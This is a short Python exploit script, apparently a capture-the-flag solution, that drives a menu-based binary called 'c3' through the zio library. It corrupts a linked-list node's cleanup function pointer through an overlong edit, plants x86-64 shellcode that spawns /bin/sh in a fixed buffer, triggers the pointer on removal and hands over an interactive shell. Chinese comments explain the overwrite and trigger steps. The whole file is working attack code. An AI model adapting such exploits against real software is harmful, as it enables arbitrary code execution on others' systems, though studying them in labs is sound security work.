# !usr/bin/python
# coding:utf-8

import time
from zio import *

def list_item(io):
    io.read_until('Quit\n')
    io.writeline('1')

def add_item(io, name, addr):
    io.read_until('Quit\n')
    io.writeline('2')
    io.read_until(':')
    io.writeline(name)
    io.read_until(':')
    io.writeline(addr)

def edit_item(io, index, name, addr):
    io.read_until('Quit\n')
    io.writeline('3')
    io.read_until(':')
    io.writeline(str(index))
    io.read_until(':')
    io.writeline(name)
    io.read_until(':')
    io.writeline(addr)

def remove_item(io, index):
    io.read_until('Quit\n')
    io.writeline('4')
    io.read_until(':')
    io.writeline(str(index))

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'), print_write=COLORED(REPR, 'green'))
    add_item(io, '123', '111')
    add_item(io, '124', '112')

    buf_addr = 0x6016c0 # point to the address of buffer
    edit_item(io, 1, '222', '2'*0x10 + '3'*0x10 + '\xc2\x16\x60')# 覆盖第二个node->cleanup地址

    # http://shell-storm.org/shellcode/files/shellcode-806.php
    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    io.read_until('Quit\n')
    io.writeline('4')
    io.read_until(':')
    io.writeline('2\x00' + shellcode)#激发第二个node->cleanup 并且把shellcode填入buffer
    io.interact()

def main():
    #target = ('127.0.0.1', 10000)
    target = './c3'
    exp(target)

if __name__ == '__main__':
    main()
